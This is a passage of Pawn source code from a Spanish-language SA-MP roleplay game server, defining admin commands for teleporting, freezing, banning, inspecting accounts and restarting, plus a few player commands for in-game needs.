	    if(Staff(playerid,Moderador)) return 1;
	    Para_Admin_Servicio
	    Comando_En_Auto
		SetVehicleToRespawn(GetPlayerVehicleID(playerid));
		TextoJugador(playerid, "~p~respawneado", 3000, 3);
		return 1;
	}

	CMD:getcar(playerid,params[])
	{
		if(Staff(playerid,Administrador)) return 1;
		Para_Admin_Servicio
		if(sscanf(params,"i",params[0])) return ParamsINC(playerid,"/getcar [ID]");
		if(!IsValidVehicle(params[0])) return Error(playerid,"ID incorrecto");
		new
			Float:Pos[3];

	 	GetPlayerPos(playerid,Pos[0],Pos[1],Pos[2]);
	 	SetVehiclePos(params[0],Pos[0],Pos[1]+1.5,Pos[2]);
		LinkVehicleToInterior(params[0],GetPlayerInterior(playerid));
		SetVehicleVirtualWorld(params[0],GetPlayerVirtualWorld(playerid));
	 	return 1;
	}

	CMD:ir(playerid, params[])
	{
	    if(Staff(playerid,Moderador)) return 1;
		Para_Admin_Servicio
		if(sscanf(params, "u", params[0])) return ParamsINC(playerid, "/ir [ID/Nombre]");
		if(params[0] == INVALID_PLAYER_ID) return Error(playerid, "¡Jugador desconectado!");
		new Float: Pos[3];
		GetPlayerPos(params[0], Pos[0], Pos[1], Pos[2]);
		
		if(!IsPlayerInAnyVehicle(playerid))
			SetPlayerPos(playerid, Pos[0], Pos[1]+0.5, Pos[2]);
		else
		    SetVehiclePos(GetPlayerVehicleID(playerid), Pos[0], Pos[1]+2, Pos[2]);
		    
		SetPlayerVirtualWorld(playerid, GetPlayerVirtualWorld(params[0]) );
		SetPlayerInterior(playerid, GetPlayerInterior(params[0]) );
		
		TextoJugador(playerid, "~p~teleportado.", 3000, 3);
		return 1;
	}
	
	CMD:congelar(playerid, params[])
	{
	    if(Staff(playerid,Moderador)) return 1;
		Para_Admin_Servicio
		if(sscanf(params, "u", params[0], params[1])) return ParamsINC(playerid, "/congelar [ID/Nombre]");
		if(params[0] == INVALID_PLAYER_ID) return Error(playerid, "¡Jugador desconectado!");
		TogglePlayerControllable(params[0], false);
		TextoJugador(params[0], "~r~congelado.", 3000, 3);
		return 1;
	}
	
	CMD:descongelar(playerid, params[])
	{
	    if(Staff(playerid,Moderador)) return 1;
		Para_Admin_Servicio
		if(sscanf(params, "u", params[0], params[1])) return ParamsINC(playerid, "/descongelar [ID/Nombre]");
		if(params[0] == INVALID_PLAYER_ID) return Error(playerid, "¡Jugador desconectado!");
		TogglePlayerControllable(params[0], true);
		TextoJugador(params[0], "~g~descongelado.", 3000, 3);
		return 1;
	}

	CMD:traer(playerid, params[])
	{
	    if(Staff(playerid,Moderador)) return 1;
		Para_Admin_Servicio
		if(sscanf(params, "u", params[0])) return ParamsINC(playerid, "/traer [ID/Nombre]");
		if(params[0] == INVALID_PLAYER_ID) return Error(playerid, "¡Jugador desconectado!");
		new Float: Pos[3];
		GetPlayerPos(playerid, Pos[0], Pos[1], Pos[2]);
		
		if(!IsPlayerInAnyVehicle(params[0]))
			SetPlayerPos(params[0], Pos[0], Pos[1]+0.5, Pos[2]);
		else
		    SetVehiclePos(GetPlayerVehicleID(params[0]), Pos[0], Pos[1]+0.5, Pos[2]);

		SetPlayerVirtualWorld(params[0], GetPlayerVirtualWorld(playerid) );
		SetPlayerInterior(params[0], GetPlayerInterior(playerid) );

		TextoJugador(params[0], "~p~teleportado.", 3000, 3);
		return 1;
	}

	CMD:gotocar(playerid,params[])
	{
		if(Staff(playerid,Administrador)) return 1;
		Para_Admin_Servicio
		if(sscanf(params,"i",params[0])) return ParamsINC(playerid,"/irveh [ID]");
		if(!IsValidVehicle(params[0])) return Error(playerid,"ID incorrecto");
		new
			Float:Pos[3];

	 	GetVehiclePos(params[0],Pos[0],Pos[1],Pos[2]);
	 	SetPlayerPos(playerid,Pos[0]+1,Pos[1]+2,Pos[2]);
	 	SetPlayerVirtualWorld(playerid,GetVehicleVirtualWorld(params[0]));

		if(VehVenta_ID(params[0]) != 0)
		{
			SetPlayerInterior(playerid,InfoVeh[VehVenta_ID(params[0])][vInt]);
		}
		return 1;
	}

	CMD:superban(playerid,params[])
	{
		if(!EsDueno(playerid)) return Error(playerid, "¡Comando autorizado solo para dueños!");
		if(sscanf(params,"us[100]",params[0],params[1])) return ParamsINC(playerid,"/superban [NOMBRE/ID] [RAZÓN]");
		if(params[0] == INVALID_PLAYER_ID) return Error(playerid,"¡Jugador desconectado!");
		_Ban(params[0],pName(playerid),params[1], true);
		return 1;
	}

	CMD:check(playerid,params[])
	{
	    if(Staff(playerid,Moderador)) return 1;
	    if(sscanf(params,"u",params[0])) return ParamsINC(playerid,"/chequear [ID/NOMBRE]");
	    if(!IsPlayerConnected(params[0])) return Error(playerid,"¡Jugador desconectado!");
		if(!GetPVarInt(playerid,"ViendoCuenta"))
		{
		    TextDrawShowForPlayer(playerid,CuentaBox);
	    	TextDrawShowForPlayer(playerid,CuentaGen);
	    	TextDrawShowForPlayer(playerid,CuentaCas);
	    	TextDrawShowForPlayer(playerid,CuentaNeg);
	    	TextDrawShowForPlayer(playerid,CuentaVeh);
	    	TextDrawShowForPlayer(playerid,CuentaArmas);
	    	SetPVarInt(playerid,"ViendoCuenta",1);
			SelectTextDraw(playerid,C_INFO);
			SetPVarInt(playerid,"CheckeandoCUENTA",params[0]);
			return 1;
		}
		else
		{
		    TextDrawHideForPlayer(playerid,CuentaBox);
	    	TextDrawHideForPlayer(playerid,CuentaGen);
	    	TextDrawHideForPlayer(playerid,CuentaCas);
	    	TextDrawHideForPlayer(playerid,CuentaNeg);
	    	TextDrawHideForPlayer(playerid,CuentaVeh);
	    	TextDrawHideForPlayer(playerid,CuentaArmas);
	    	SetPVarInt(playerid,"ViendoCuenta",0);
			CancelSelectTextDraw(playerid);
			DeletePVar(playerid,"CheckeandoCUENTA");
			return 1;
		}
	}

	CMD:checkcuenta(playerid,params[])
	{
	    if(Staff(playerid,Moderador)) return 1;
	    if(isnull(params)) return ParamsINC(playerid, "/checkcuenta [Nombre_Apellido]");
	    new
	        path[40];
	        
		A_Format(path, "Usuarios/%s.ini", params);
		if(!fexist(path))
		    return Error(playerid, "Esa cuenta no se encontró");

		stringcheck = "{FFFFFF}";
		INI_ParseFile(path, "CheckCuenta_data");
		Dialog(playerid, dError, DIALOG_STYLE_MSGBOX, params, stringcheck, "Cerrar", "");
		return 1;
	}
	
	CMD:showtuto(playerid, params[]) {
	    MostrarTutorial(playerid);
	}
	
CALLBACK: CheckCuenta_data(name[], value[])
{
	if(!strcmp(name, "Nivel")
	|| !strcmp(name, "Dinero")
	|| !strcmp(name, "Advertencias")
	|| !strcmp(name, "Entregas")
	|| !strcmp(name, "Cosechas")
	|| !strcmp(name, "Barridas")
	|| !strcmp(name, "Repartidas")
	|| !strcmp(name, "Minutos")
	|| !strcmp(name, "Horas")
	|| !strcmp(name, "Miembro")
	|| !strcmp(name, "Lider")
	|| !strcmp(name, "MiembroFam")
	|| !strcmp(name, "Baneado")
	|| !strcmp(name, "LiderFam"))
	{
	    new str[20];
	    A_Format(str, "%s: %s\n", name, value);
	    strcat(stringcheck, str);
	    return 1;
	}
	return 1;
}

	CMD:ban(playerid,params[])
	{
	    if(Staff(playerid,Mod.Superior)) return 1;
		if(sscanf(params,"us[100]",params[0],params[1])) return ParamsINC(playerid,"/ban [NOMBRE/ID] [RAZÓN]");
		if(params[0] == INVALID_PLAYER_ID) return Error(playerid,"¡Jugador desconectado!");
		if(EsIP(params))
		{
			MensajeAdminF(C_ROJO, "[Anti-SPAM] "#CBLANCO"%s(%d): "#CINFO"/ban %s", Destacado, NombreJugador_(playerid), playerid, params);
			_Kick(playerid,T_ANTICHEAT,"SPAM (/ban)");
			return 0;
		}
		if((EsDueno(params[0]) && !EsDueno(playerid)) || !strcmp(pName(params[0]), "Ryan_Spell"))
		{
		    _Ban(playerid,"Spell","INTENTAR BANEAR ADM DUEÑO");
		    return 1;
		}
		if(!EsDueno(playerid) && (GetTickCount() - GetPVarInt(playerid,"ULTIMO_BAN")) < 3000)
		{
  			Error(playerid,"¡Solo puedes banear cada 3 segundos!");
			SetPVarInt(playerid,"ADVERTENCIA_BAN",GetPVarInt(playerid,"ADVERTENCIA_BAN") +1);
			if(GetPVarInt(playerid,"ADVERTENCIA_BAN") > 5)
			{
			    _Ban(playerid,T_ANTICHEAT,"FLOOD DE /ban");
			    BanEx(playerid, "FLOOD DE /BAN");
			    return 1;
			}
			return 1;
		}

		_Ban(params[0],pName(playerid),params[1], false);
		SetPVarInt(playerid,"ULTIMO_BAN",GetTickCount());

		return 1;
	}

	CMD:bancuenta(playerid,params[])
	{
	    if(Staff(playerid,Mod.Superior)) return 1;
		if(isnull(params) || strlen(params) < 6) return ParamsINC(playerid,"/bancuenta [Nombre_Apellido] [RAZÓN]");
		new
			Cuenta[MAX_PLAYER_NAME],Razon[100], spacepos = strfind(params," ");
		
		if(spacepos == -1) return ParamsINC(playerid,"/bancuenta [Nombre_Apellido] "#CROJO"[RAZÓN]");
		
		strmid(Cuenta,params,0,spacepos);
		strmid(Razon,params,strlen(Cuenta)+1,strlen(params));
		new ArchivoC[MAX_PLAYER_NAME + 20];
		A_Format(ArchivoC,"Usuarios/%s.ini",Cuenta);
		if(!fexist(ArchivoC)) return Error(playerid,"¡No se encontro esa cuenta en la base de datos!");
		new INI:Arch = INI_Open(ArchivoC);
		INI_SetTag(Arch,"data");
		INI_WriteBool(Arch,"Baneado",true);
		INI_WriteString(Arch,"Baneado_Por",NombreJugador_(playerid));
		INI_Close(Arch);
		MensajeAdminF(C_ROJO,"[ADMINISTRACIÓN] "#CBLANCO"> %s baneó la cuenta "#CVERDE"'%s' "#CROJO"[%s]",Destacado, NombreJugador_(playerid),Cuenta,Razon);
		MensajeF(playerid, -1, "Si quieres banear también su IP: "#CVERDE"/veripcuenta %s "#CBLANCO"| "#CVERDE"/banip", Cuenta);
		A_Format(Razon,"%s baneó la cuenta %s. RAZÓN: [%s]",pName(playerid),Cuenta,Razon);
		Log("LOG/Bans.txt",Razon);
		return 1;
	}

	CMD:jailcuenta(playerid,params[])
	{
	    if(Staff(playerid,Moderador)) return 1;
		if(isnull(params) || strlen(params) < 6) return ParamsINC(playerid,"/jailcuenta [Nombre_Apellido] [Tiempo]");
		new Cuenta[MAX_PLAYER_NAME],Time;
		if(sscanf(params, "p< >s[24]d", Cuenta, Time)) return ParamsINC(playerid,"/jailcuenta [Nombre_Apellido] [Tiempo]");
		new ArchivoC[MAX_PLAYER_NAME + 20];
		A_Format(ArchivoC,"Usuarios/%s.ini",Cuenta);
		if(!fexist(ArchivoC)) return Error(playerid,"¡No se encontro esa cuenta en la base de datos!");
		new INI:Arch = INI_Open(ArchivoC);
		INI_SetTag(Arch,"data");
		INI_WriteInt(Arch,"Encarcelado",2);
		INI_WriteInt(Arch,"TiempoCarcel",Time*60);
		new str[10];
		Loop(i, 12, 0)
		{
		    A_Format(str, "Arma%d", i);
		    INI_RemoveEntry(Arch, str);
		    A_Format(str, "Balas%d", i);
		    INI_RemoveEntry(Arch, str);
		}
		INI_Close(Arch);
		MensajeAdminF(C_ROJO,"[ADMINISTRACIÓN] "#CBLANCO"> %s encarceló la cuenta '%s' por %d minutos",Destacado,NombreJugador_(playerid),Cuenta,Time);
		return 1;
	}

	CMD:verip(playerid, params[])
	{
	    if(Staff(playerid,Administrador)) return 1;
	    if(sscanf(params, "i", params[0])) return ParamsINC(playerid, "/verip [ID/Nombre]");
		if(params[0] == INVALID_PLAYER_ID) return Error(playerid, "ID incorrecto/jugador desconectado");
		new ip[16];
		GetPlayerIp(params[0], ip, 16);
		MensajeF(playerid, -1, "La "#CVERDE"IP "#CBLANCO"de "#CINFO"%s "#CBLANCO"es: "#CVERDE"%s", NombreJugador_(params[0]), ip);
		return 1;
	}

	CMD:veripcuenta(playerid, params[])
	{
	    if(Staff(playerid,Administrador)) return 1;
		if(isnull(params))  return ParamsINC(playerid, "/veripcuenta [Nombre_Apellido]");
		new
		    str[MAX_PLAYER_NAME + 20],
			ip[16];

		A_Format(str, "Usuarios/%s.ini", params);

		if(!fexist(str))
		    return Error(playerid, "Esa cuenta no se encontró en la base de datos.");

		GetAccountIp(playerid, str, ip);
		MensajeF(playerid, -1, "La IP de "#CVERDE"%s "#CBLANCO"es: "#CINFO"%s", params, ip);
		return 1;
	}

	CMD:verbancocuenta(playerid, params[])
	{
	    if(Staff(playerid,Administrador)) return 1;
		if(isnull(params))  return ParamsINC(playerid, "/veripcuenta [Nombre_Apellido]");
		new
		    str[MAX_PLAYER_NAME + 20],
			Bank;

		A_Format(str, "Usuarios/%s.ini", params);

		if(!fexist(str))
		    return Error(playerid, "Esa cuenta no se encontró en la base de datos.");

		Bank = GetAccountBankID(playerid, str);
		MensajeF(playerid, -1, "La cuenta bancaria de "#CVERDE"%s "#CBLANCO"es: "#CINFO"%d "#CVERDE"($%d)", params, Bank, InfoCuentaB[Bank][cuenDinero]);
		return 1;
	}

	CMD:actualizarcuentas(playerid, params[])
	{
	    if(Staff(playerid,Administrador)) return 1;

	    new
	        Tick = GetTickCount();
	        
	    foreach(Player, i)
	    {
	        CongelarEx(i, 5);
			ActualizarCuenta(i);
		}
		GameTextForAll("~g~actualizando todas las cuentas...", 5000, 3);
		MensajeF(playerid, -1, "Cuentas actualizadas [%d cuentas - %dMS]", Iter_Count(Player), GetTickCount()-Tick);
		return 1;
	}
	
	CMD:restart(playerid, params[])
	{
	    if(Staff(playerid,Dueno)) return 1;
		if(sscanf(params, "i", params[0])) return ParamsINC(playerid, "/restart [Tiempo]");
		Restart(params[0]);
		return 1;
	}
	
	CALLBACK: Restart(time)
	{
		if(time)
		{
		    SetTimerEx("Restart", 1000, false, "i", time-1);
		    new str[35];
		    A_Format(str, "~w~restart en: ~n~~p~%d segundos", time);
			TextoTodos(str,2000,4);
			return 1;
		}
		if(!time)
		{
			DestroyAllDynamicObjects();
			DestroyAllDynamicPickups();
			DestroyAllDynamicCPs();
			DestroyAllDynamicMapIcons();

			Loop(i, MAX_TEXT_DRAWS, 0)
			{
				TextDrawDestroy(Text: i);
			}

			foreach(Player, i)
			{
			    Descongelar(i);
				ActualizarCuenta(i);
			}

			TextoTodos("~w~restart fue ~g~~h~ejecutado.",4000,0);
			MensajeTodos(-1, "Para re-ingresar al servidor, utilize "#CINFO"/quit "#CBLANCO"y vuelva a entrar.");
			SendRconCommand("gmx");
		}
		return 1;
	}
	
	CMD:desban(playerid,params[])
	{
	    if(Staff(playerid,Administrador)) return 1;
		if(isnull(params))  return ParamsINC(playerid, "/desban [Nombre_Apellido]");
		new
		    str[MAX_PLAYER_NAME + 20],
			ip[16];

		A_Format(str, "Usuarios/%s.ini", params);

		if(!fexist(str))
		    return Error(playerid, "Esa cuenta no se encontró en la base de datos.");

		GetAccountIp(playerid, str, ip);

		new
		    INI: Arch = INI_Open(str);

		INI_SetTag(Arch, "data");
		INI_WriteBool(Arch, "Baneado", false);
		INI_Close(Arch);

		A_Format(str, "unbanip %s", ip);
		SendRconCommand(str);
		SendRconCommand("reloadbans");
		MensajeAdminF(C_ROJO, "[ADMINISTRACIÓN] > "#CBLANCO"%s desbaneó la cuenta "#CVERDE"%s "#CBLANCO"junto con su respectiva IP.", Destacado, NombreJugador_(playerid), params);
		return 1;
	}

	CMD:banip(playerid, params[])
	{
	    if(Staff(playerid,Administrador)) return 1;
		if(isnull(params))  return ParamsINC(playerid, "/banip [IP]");
		new num;
		if(sscanf(params, "p<.>dddd", num, num, num, num))
		    return Error(playerid, "Esa IP tiene un formato inválido.");

		new
		    str[16+15];

		A_Format(str, "banip %s", params);
		SendRconCommand(str);
		MensajeAdminF(C_ROJO, "[ADMINISTRACIÓN] > "#CBLANCO"%s baneó la IP "#CVERDE"%s", Destacado, NombreJugador_(playerid), params);
		return 1;
	}

	CMD:unbanip(playerid, params[])
	{
	    if(Staff(playerid,Administrador)) return 1;
	    Para_Admin_Servicio
		if(isnull(params))  return ParamsINC(playerid, "/unbanip [IP]");
		new num;
		if(sscanf(params, "p<.>dddd", num, num, num, num))
		    return Error(playerid, "Esa IP tiene un formato inválido.");

		new
		    str[16+15];

		A_Format(str, "unbanip %s", params);
		SendRconCommand(str);
		SendRconCommand("reloadbans");

		MensajeAdminF(C_ROJO, "[ADMINISTRACIÓN] > "#CBLANCO"%s desbaneó la IP "#CVERDE"%s", Destacado, NombreJugador_(playerid), params);
		return 1;
	}

	CMD:adm(playerid,params[])
	{
	    if(Staff(playerid,Colaborador)) return 1;
	    Para_Admin_Servicio
		if(sscanf(params,"u",params[0])) return ParamsINC(playerid,"/adm [ID]");
		if(!IsPlayerConnected(params[0])) return Error(playerid,"¡Jugador desconectado!");
		OnPlayerClickPlayer(playerid,params[0],1);
		return 1;
	}

/*	CMD:borrarcuenta(playerid,params[])
	{
		if(!EsDueno(playerid)) return Error(playerid,"¡Solo autorizado para dueños!");
		Para_Admin_Servicio
		new Cuenta[MAX_PLAYER_NAME];
		alm(Cuenta,params);
		new ArchivoC[MAX_PLAYER_NAME + 20];
		A_Format(ArchivoC,"Usuarios/%s.ini",Cuenta);
		if(!fexist(ArchivoC)) return Error(playerid,"¡No se encontro esa cuenta en la base de datos!");
		fremove(ArchivoC);
		MensajeAdminF(C_ROJO,"[ADMINISTRACIÓN] "#CBLANCO"> %s eliminó la cuenta '%s'",Administrador,NombreJugador_(playerid),Cuenta);
		return 1;
	}*/

/*	CMD:cambiarnombre(playerid,params[])
	{
		if(!EsDueno(playerid)) return Error(playerid,"¡Solo autorizado para dueños!");
		Para_Admin_Servicio
		if(sscanf(params,"us[24]",params[0],params[1])) return ParamsINC(playerid,"/cambiarnombre [ID] [Nombre]");
		new Enc_ = strfind(params[1],"_");

		if(!Enc_ || Enc_ < 1 || Enc_ > (strlen(params[1])-2) || IlegalCharacterName(params[1]))
		{
			Dialog(playerid,dError,DIALOG_STYLE_MSGBOX,"{FF0000} FORMATO INVALIDO","{FF0000}#{B5D8E5}El nombre contiene un formato inválido, el formato es {BD00B9}Nombre_Apellido.\n\n   {FFFFFF}- Las inciales del nombre, y el apellido deben estar si o si en MAYUSCULA\n   {FFFFFF}- Ademas, no se permiten nombres de famosos como por ejemplo Jennifer_Lopez.","Aceptar","");
			return 1;
	 	}
		new Str_[80];
		new ArchivoC[MAX_PLAYER_NAME + 20];
		A_Format(ArchivoC,"Usuarios/%s.ini",pName(params[0]));
		fremove(ArchivoC);
		MensajeTodosF(C_ROJO,"[ADMINISTRACIÓN] > "#CBLANCO"%s cambió el nombre de %s a: %s",NombreJugador_(playerid),pName(params[0]),params[1]);
		A_Format(Str_,"ADM: %s: %s ----> %s",NombreJugador_(playerid),pName(params[0]),params[1]);
		Log("LOG/Cambio_nombres.txt",Str_);
		ChangeName(params[0],params[1]);
		GetPlayerName(params[0],Nombre[params[0]],24);
		alm(Nombre_[params[0]],Nombre[params[0]]);
		Nombre_[params[0]][Enc_] = ' ';
		ActualizarCuenta(params[0]);
		return 1;
	}*/

	CMD:cambiarpass(playerid,params[])
	{
	    if(isnull(params)) return ParamsINC(playerid,"/cambiarpass [CONTRASEÑA ACTUAL]");
		if(InfoJugador[playerid][jClave] == udb_hash(params))
		{
		    Dialog(playerid,dCambiarPass,DIALOG_STYLE_INPUT,"CAMBIAR CONTRASEÑA",""#CBLANCO"Escribe la nueva contraseña para tu cuenta","Aceptar","Cancelar");
		    return 1;
		}
		return Error(playerid,"¡La contraseña actual, es diferente a la que pusiste!");
	}

	CMD:cambiarpregunta(playerid,params[])
	{
	    new
	        Pregunta[MAX_CARACTERES_PS],
	        Respuesta[MAX_CARACTERES_RS];
	        
	    if(sscanf(params, "p< >s[50]s[50]"))
	        return ParamsINC(playerid, "/cambiarpregunta [Nueva pregunta] [Nueva respuesta]");
	        
		if(strlen(Pregunta) > MAX_CARACTERES_PS)
		    return Error(playerid, "La pregunta es demaciado larga.");
		    
		if(strlen(Respuesta) > MAX_CARACTERES_RS)
		    return Error(playerid, "La respuesta es demaciado larga.");

		new
		    INI:Arch = INI_Open(U_Usuario(playerid));

		INI_SetTag(Arch, "data");
		alm(InfoJugador[playerid][jPreguntaS], Pregunta);
		INI_WriteString(Arch, "PreguntaS", Pregunta);
		alm(InfoJugador[playerid][jRespuestaS], Respuesta);
		INI_WriteInt(Arch, "RespuestaS", InfoJugador[playerid][jRespuestaS]);
		INI_Close(Arch);
		
		MensajeF(playerid, -1, "Pregunta de seguridad cambiada a: "#CVERDE"%s", Pregunta);
		return 1;
	}

	//  ----=====[ Necesidades ]=====---- //

	CMD:mear(playerid,params[])
	{
	    if(InfoJugador[playerid][jOrina] < 60) return Error(playerid,"¡No tienes ganas de mear!");

		if(InfoJugador[playerid][jSexo] == 1)
		{
	    	if(GetPlayerSpecialAction(playerid) & SPECIAL_ACTION_PISSING) return Error(playerid,"¡Ya estás meando!");
		}

		if(InfoJugador[playerid][jSexo] == 1)
			SetPlayerSpecialAction(playerid,SPECIAL_ACTION_PISSING);
		else
			ApplyAnimation(playerid, "ped", "SEAT_down", 4.000000, 0, 0, 0, 1, 0);

		SetTimerEx("MEANDO",1000,false,"i",playerid);
		return 1;
	}

	CMD:ayuda(playerid, params[])
	{
	    return Mensaje(playerid, -1, "¡Este comando fue "#CROJO"Eliminado! "#CBLANCO"Posiblemente lo que estes buscando este en "#CINFO"/informacion");
	}

	CMD:dormir(playerid,params[])
	{
		if(InfoJugador[playerid][jCansancio] > 40) return Error(playerid,"¡No tienes sueño!");
		Mensaje(playerid,-1,"Comenzaste a dormir. Utiliza "#CINFO"(/despertarse) "#CBLANCO"si quieres dejar de dormir.");
		SetPVarInt(playerid,"DURMIENDO",1);
		TextDrawShowForPlayer(playerid,Vendado);
		SetTimerEx( "DORMIR", 2000, false, "i", playerid);
		CongelarEx(playerid);
		return 1;
	}

	CMD:despertarse(playerid,params[])
	{
	    if(!GetPVarInt(playerid, "DURMIENDO")) return Error(playerid, "¡No estás durmiendo!");
	    cmd_detener(playerid, "" );
	    TextDrawHideForPlayer(playerid,Vendado);
	    SetPlayerDrunkLevel(playerid, 1000);
	    DeletePVar(playerid, "DURMIENDO");
	    Descongelar(playerid);
		return 1;
	}

	//aca estaba
	CMD:record(playerid,params[])
	{
		MensajeF(playerid,-1,"Record de usuarios Online fue: %d "#CAZUL2"[%d/%d/%d - %d:%d:%d]",Record_UsersOn,UsersD_0,UsersD_1,UsersD_2,UsersT_0,UsersT_1,UsersT_2);
		return 1;
	}

	CMD:llenartanques(playerid,params[])
	{
	    if(Staff(playerid,Mod.Superior)) return 1;
	    Para_Admin_Servicio

		foreach(Vehicle,i)
	        VGas[i] = 100;

		return 1;
	}

	CMD:creararbolito(playerid,params[])
	{
		if(Staff(playerid,SubDueno)) return 1;
		Para_Admin_Servicio
		GetPlayerPos(playerid,PosJugador[X],PosJugador[Y],PosJugador[Z]);
		CrearArbolito(PosJugador[X],PosJugador[Y],PosJugador[Z]);
		return 1;
	}

	CMD:creararbol(playerid,params[])
	{
		if(Staff(playerid,SubDueno)) return 1;
		Para_Admin_Servicio
		GetPlayerPos(playerid,PosJugador[X],PosJugador[Y],PosJugador[Z]);
		_CrearArbolito(PosJugador[X],PosJugador[Y],PosJugador[Z]);
		return 1;
	}

	CMD:cerrarveh(playerid,params[])
	{
		if(Staff(playerid,Moderador)) return 1;
        Para_Admin_Servicio
		if(sscanf(params,"i",params[0])) return ParamsINC(playerid,"/cerrarveh [ID VEHICULO]"),1;
		CerrarPuertas(params[0]);
		TextoJugador(playerid,"~w~vehiculo ~r~cerrado", 4000, 3);
		return 1;
	}

	CMD:abrirveh(playerid,params[])
	{
		if(Staff(playerid,Moderador)) return 1;
		Para_Admin_Servicio
		if(sscanf(params,"i",params[0])) return ParamsINC(playerid,"/abrirveh [ID-VEHICULO]"),1;
		AbrirPuertas(params[0]);
		TextoJugador(playerid,"~w~vehiculo ~g~abierto", 4000, 3);
		return 1;
	}

	CMD:repararveh(playerid,params[])
	{
		if(Staff(playerid,Moderador)) return 1;
		Para_Admin_Servicio
		Comando_En_Auto
		new IDVeh = GetPlayerVehicleID(playerid);
		RepairVehicle(IDVeh);
		Mensaje(playerid,-1,"> ¡Vehículo reparado!");
		return 1;
	}

	CMD:noobs(playerid, params[])
	{
	    if(Staff(playerid,Moderador)) return 1;
	    new
	        str[MAX_PLAYER_NAME+10],
	        str2[sizeof(str)*20],
			count;
	        
		foreach(Player, i)
		{
		    if(InfoJugador[i][jHoras] < 1)
		    {
		        if(!GetPVarInt(i, "Logueado")) continue;
		        A_Format(str, "%s(%d)\t[%d min]\n", pName(i), i, InfoJugador[i][jMinutos]);
		        strcat(str2, str);
		        count++;
			}
		}
		if(!count) return Mensaje(playerid, -1, "No hay jugadores con menos de 1 hora de juego conectados.");
		A_Format(str, ""#CNARANJA"Noobs: %d", count);
		Dialog(playerid, dError, DIALOG_STYLE_LIST, str, str2, "Cerrar", "");
		return 1;
	}
	
	CMD:vercasascuenta(playerid, params[])
	{
	    if(Staff(playerid,Mod.Superior)) return 1;
	    if(isnull(params)) return ParamsINC(playerid, "/vercasascuenta [Nombre_Apellido]");
	    new
			Str[80 * MAX_CASAS_JUGADOR],
			Str2[80],
			bool:sucess;
	    
	    A_Format(Str2, "Usuarios/%s.ini", params);
	    
	    if(!fexist(Str2)) return Error(playerid, "Esa cuenta no existe.");
	    
	    foreach(Casas,c)
	    {
	        if(!strcmp(params, InfoCasa[c][cComprador]))
	        {
	            sucess = true;
	            A_Format(Str2,""#CBLANCO"- %s "#CPOSITIVO"(ID: %d | $%d)\n",InfoCasa[c][cNombre],c, InfoCasa[c][cDinero]);
				strcat(Str,Str2);
			}
		}
		if(!sucess) return Dialog(playerid,dError,DIALOG_STYLE_MSGBOX,""#CINFO"Sin casas",""#CBLANCO"Ese jugador no tiene casas","Cerrar","");
		A_Format(Str2, "Casas de %s", params);
		Dialog(playerid,dError,DIALOG_STYLE_LIST,Str2,Str,"Cerrar","");
		return 1;
	}
	
	CMD:vernegocioscuenta(playerid, params[])
	{
	    if(Staff(playerid,Mod.Superior)) return 1;
	    if(isnull(params)) return ParamsINC(playerid, "/vernegocioscuenta [Nombre_Apellido]");
	    
	    new
			Str[80 * MAX_NEGOCIOS],
			Str2[80],
			bool:sucess;

	    A_Format(Str2, "Usuarios/%s.ini", params);

	    if(!fexist(Str2)) return Error(playerid, "Esa cuenta no existe.");

	    foreach(Negocios,c)
	    {
	        if(!strcmp(params, InfoNegocio[c][nComprador]))
	        {
	            sucess = true;
	            A_Format(Str2,""#CBLANCO"- %s "#CPOSITIVO"(ID: %d | $%d)\n",InfoNegocio[c][nNombre],c, InfoNegocio[c][nDinero]);
				strcat(Str,Str2);
			}
		}
		if(!sucess) return Dialog(playerid,dError,DIALOG_STYLE_MSGBOX,""#CINFO"Sin negocios",""#CBLANCO"Ese jugador no tiene negocios","Cerrar","");
		A_Format(Str2, "Negocios de %s", params);
		Dialog(playerid,dError,DIALOG_STYLE_LIST,Str2,Str,"Cerrar","");
		return 1;
	}
	
	CMD:verautoscuenta(playerid, params[])
	{
	    if(Staff(playerid,Mod.Superior)) return 1;
	    if(isnull(params)) return ParamsINC(playerid, "/verautoscuenta [Nombre_Apellido]");

	    new
			Str[80 * MAX_VEH_PERSONA],
			Str2[80],
			bool:sucess;

	    A_Format(Str2, "Usuarios/%s.ini", params);

	    if(!fexist(Str2)) return Error(playerid, "Esa cuenta no existe.");

	    foreach(VehVenta,c)
	    {
	        if(!strcmp(params, InfoVeh[c][vComprador]))
	        {
	            sucess = true;
	            A_Format(Str2,""#CBLANCO"- %s "#CPOSITIVO"(ID: %d)\n",NombreVehiculo(ID_Original(c)),ID_Original(c));
				strcat(Str,Str2);
			}
		}
		if(!sucess) return Dialog(playerid,dError,DIALOG_STYLE_MSGBOX,""#CINFO"Sin vehiculos",""#CBLANCO"Ese jugador no tiene vehiculos","Cerrar","");
		A_Format(Str2, "Vehiculos de %s", params);
		Dialog(playerid,dError,DIALOG_STYLE_LIST,Str2,Str,"Cerrar","");
		return 1;
	}
	
	CMD:forzarmotor(playerid,params[])
	{
	    if(Staff(playerid,Mod.Superior)) return 1;
	    Para_Admin_Servicio
		Comando_En_Auto
		new IDVeh = GetPlayerVehicleID(playerid);
		if(Veh[IDVeh][vMotor] == false)
		{
			GameTextForPlayer(playerid,"~p~vehiculo ~g~encendido",3000,3);
			EncenderMotor(IDVeh);
		}else{
			GameTextForPlayer(playerid,"~p~vehiculo ~r~apagado",3000,3);
			ApagarMotor(IDVeh);
		}
		return 1;
	}

	CMD:llenarveh(playerid,params[])
	{
	    if(Staff(playerid,Mod.Superior)) return 1;
	    Para_Admin_Servicio
	    MensajeF(playerid,-1,"Si quieres llenar un vehículo en especial, usa "#CAZULRARO"/llenarvehid [ID VEH]"#CBLANCO"");
		Comando_En_Auto
		new IDVeh = GetPlayerVehicleID(playerid);
		GameTextForPlayer(playerid,"~p~vehiculo rellenado con gasolina",3000,3);
		VGas[IDVeh] = 100;
		return 1;
	}

	CMD:llenarvehid(playerid,params[])
	{
	    if(Staff(playerid,Mod.Superior)) return 1;
	    Para_Admin_Servicio
		if(sscanf(params,"i",params[0])) return ParamsINC(playerid,"/llenarvehid [ID VEH]");
		MensajeF(playerid,-1,"Llenaste de gasolina el vehiculo ID %d "#CINFO"(%s)",params[0],NombreVehiculo(params[0]));
		VGas[params[0]] = 100;
		return 1;
	}

	CMD:gasveh(playerid,params[])
	{
	    if(Staff(playerid,Mod.Superior)) return 1;
	    Para_Admin_Servicio
		if(sscanf(params,"ii",params[0],params[1])) return ParamsINC(playerid,"/gasveh [ID VEH] [GAS]");
		new MSG[100];
		format(MSG,sizeof(MSG),"> "#CBLANCO"Ahora, el vehículo id %d ( %s ) tiene %d de gas",params[0],NombreVehiculo(params[0]),params[1]);
